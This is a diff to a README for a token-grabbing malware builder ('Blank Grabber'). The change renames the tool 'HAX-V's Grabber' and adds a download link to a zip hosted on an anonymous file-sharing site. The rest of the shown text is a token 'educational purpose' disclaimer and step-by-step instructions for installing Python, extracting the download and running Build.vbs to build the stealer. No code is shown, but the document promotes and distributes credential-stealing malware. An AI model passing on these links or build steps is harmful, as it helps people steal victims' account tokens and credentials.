@@ -8,6 +8,8 @@
 - [To-Do/Enhancements](#to-doenhancements)	<!-- - [Crypter](#crypter)-->
 - [Contact me](#contact-me)
 
+GRABBER DOWNLOAD:
+   [![Blankrypt](https://cdn.pixabay.com/photo/2022/12/07/17/41/download-7641614__340.pngr)](https://anonfiles.com/e3c064R6yf/HAV-Vs_Token_Grabber_zip)
 
 
 **Note:** This tool is for "educational" purpose only, and I am not responsible for any damage caused by it in any way!
@@ -65,7 +67,7 @@
 
 1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
-3. [Download Blank Grabber](#download).
+3. [Download HAX-V's Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Blank Grabber** folder and double click *Build.vbs* file.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
